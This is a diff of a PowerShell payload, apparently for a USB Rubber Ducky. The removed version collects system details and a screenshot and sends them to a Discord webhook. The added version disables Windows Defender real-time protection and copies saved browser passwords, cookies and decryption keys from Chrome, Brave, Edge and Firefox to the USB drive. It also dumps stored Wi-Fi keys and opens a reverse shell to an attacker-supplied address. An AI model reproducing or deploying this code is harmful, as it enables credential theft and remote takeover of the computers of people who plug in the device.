@@ -1,114 +1,140 @@
-# Funzione per ottenere l'indirizzo IP pubblico
-function Get-PublicIP {
-    try {
-        $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org").Content
-        return $publicIP
-    } catch {
-        return "Impossibile ottenere l'IP pubblico"
-    }
+
+
+#-- Payload configuration --#
+
+$DRIVE = 'DUCKY'          # Drive letter of the USB Rubber Ducky
+$IP = 'YOUR_IP'     # IP address of the attacker machine
+$PORT = 'YOUR_PORT'            # Port to use for the reverse shell
+
+
+# Set destination directory
+
+
+
+$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $DRIVE }).DeviceID
+Set-Location $duckletter
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath "${duckletter}\"
+Set-MpPreference -ExclusionExtension "ps1"
+
+$destDir = "$duckletter\$env:USERNAME"
+if (-Not (Test-Path $destDir)) {
+    New-Item -ItemType Directory -Path $destDir
 }
 
-# Funzione per catturare uno screenshot e salvarlo
-function Capture-Screenshot {
-    Add-Type -TypeDefinition @"
-    using System;
-    using System.Drawing;
-    using System.Windows.Forms;
-    public class Screenshot {
-        public static void TakeScreenshot() {
-            Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
-            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) {
-                using (Graphics g = Graphics.FromImage(bitmap)) {
-                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
-                }
-                bitmap.Save('C:\\Windows\\Temp\\screenshot.png');
-            }
+# Function to copy browser files
+function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
+    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
+    if (-Not (Test-Path $browserDestDir)) {
+        New-Item -ItemType Directory -Path $browserDestDir
+    }
+
+    foreach ($file in $filesToCopy) {
+        $source = Join-Path -Path $browserDir -ChildPath $file
+        if (Test-Path $source) {
+            Copy-Item -Path $source -Destination $browserDestDir
+            Write-Host "$browserName - File copiato: $file"
+        } else {
+            Write-Host "$browserName - File non trovato: $file"
         }
     }
-"@
-    [Screenshot]::TakeScreenshot()
 }
 
-# Ottieni informazioni sul sistema
-$systemInfo = Get-ComputerInfo
+# Configuration for Google Chrome
+$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+$chromeFilesToCopy = @("Login Data")
+CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
+Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue
 
-# Ottieni informazioni sul disco
-$diskInfo = Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, DriveType, @{Name="Size(GB)";Expression={[math]::round($_.Size / 1GB, 2)}}, @{Name="FreeSpace(GB)";Expression={[math]::round($_.FreeSpace / 1GB, 2)}}
+# Configuration for Brave
+$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
+$braveFilesToCopy = @("Login Data")
+CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
+Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue
 
-# Ottieni informazioni sulla CPU
-$cpuInfo = Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed
-
-# Ottieni informazioni sulla memoria
-$memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Select-Object Manufacturer, Capacity, Speed
-
-# Ottieni gli indirizzi IP privati
-$privateIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet" | Select-Object -ExpandProperty IPAddress)
-
-# Ottieni l'indirizzo IP pubblico
-$publicIP = Get-PublicIP
-
-# Informazioni sul sistema operativo
-$osInfo = Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, Architecture
-
-# Interfacce di rete (MAC Address, etc.)
-$networkInterfaces = Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed
-
-# Dettagli sui processi in esecuzione
-$processes = Get-Process | Select-Object Name, Id, CPU, Memory
-
-# Compilazione dei dati in un oggetto per la visualizzazione
-$info = @{
-    "Sistema" = $systemInfo
-    "Disco" = $diskInfo
-    "CPU" = $cpuInfo
-    "Memoria" = $memoryInfo
-    "Indirizzo IP Privato" = $privateIP
-    "Indirizzo IP Pubblico" = $publicIP
-    "Sistema Operativo" = $osInfo
-    "Interfacce di Rete" = $networkInterfaces
-    "Processi in Esecuzione" = $processes
+# Configuration for Firefox
+$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
+$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
+if ($firefoxProfile) {
+    $firefoxDir = $firefoxProfile.FullName
+    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
+    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
+} else {
+    Write-Host "Firefox - Nessun profilo trovato."
 }
 
-# Creazione di una stringa di output
-$output = ""
-foreach ($key in $info.Keys) {
-    $output += "$key:`n"
-    $output += $info[$key] | Out-String
-    $output += "`n"
-}
+# Configuration for Microsoft Edge
+$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+$edgeFilesToCopy = @("Login Data")
+CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
+Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue
 
-# Salvataggio dell'output in un file di testo
-$output | Out-File -FilePath "C:\Windows\Temp\system_info.txt"
-
-# Cattura dello screenshot
-Capture-Screenshot
-
-# Invia l'output al webhook Discord
-$webhookUrl = "https://discord.com/api/webhooks/1305148744034942987/rIucBCJqT3ZvW9zzlZiE889d11X5xaKSk1h8cgK-LwaiRFBhX-iwowFKg9xAVZHt326I"
-Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{
-    content = "Informazioni di sistema raccolte:"
-    embeds = @(@{
-        title = "Dettagli di Sistema"
-        description = $output
-        color = 0x00FF00
-    })
-} | ConvertTo-Json)
-
-# Invio del file screenshot a Discord (usando il Webhook)
-$boundary = [System.Guid]::NewGuid().ToString()
-$fileContent = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\screenshot.png")
-$base64Image = [Convert]::ToBase64String($fileContent)
-
-Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body (@{
-    "file" = @{
-        "name" = "screenshot.png"
-        "content" = $base64Image
+# Gather additional system information
+function GatherSystemInfo {
+    $sysInfoDir = "$duckletter\$env:USERNAME\SystemInfo"
+    if (-Not (Test-Path $sysInfoDir)) {
+        New-Item -ItemType Directory -Path $sysInfoDir
     }
-    "embeds" = @(
-        @{
-            "title" = "Screenshot"
-            "description" = "Screenshot del sistema"
-            "color" = 0xFF0000
+
+    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
+    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
+    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
+    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
+}
+
+GatherSystemInfo
+
+# Network scanning
+
+
+# Retrieve Wi-Fi passwords
+function GetWifiPasswords {
+    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
+
+    $results = @()
+
+    foreach ($profile in $wifiProfiles) {
+        $profileDetails = netsh wlan show profile name="$profile" key=clear
+        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
+        $results += [PSCustomObject]@{
+            ProfileName = $profile
+            KeyContent  = $keyContent
         }
+    }
+
+    $results | Format-Table -AutoSize
+
+    # Save results to a file
+    $results | Out-File -FilePath "$duckletter\$env:USERNAME\WiFi_Details.txt"
+}
+
+GetWifiPasswords
+
+# Reverse shell
+function ReverseShell {
+    param(
+        [string]$ip,
+        [int]$port
     )
-} | ConvertTo-Json)
+
+    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+    $stream = $client.GetStream()
+    [byte[]]$bytes = 0..65535 | ForEach-Object {0}
+    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
+        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+        $stream.Write($sendbyte, 0, $sendbyte.Length)
+        $stream.Flush()
+    }
+    $client.Close()
+}
+
+ReverseShell -ip $IP -port $PORT
+
+# Re-enable Windows Defender real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $false
+
+exit
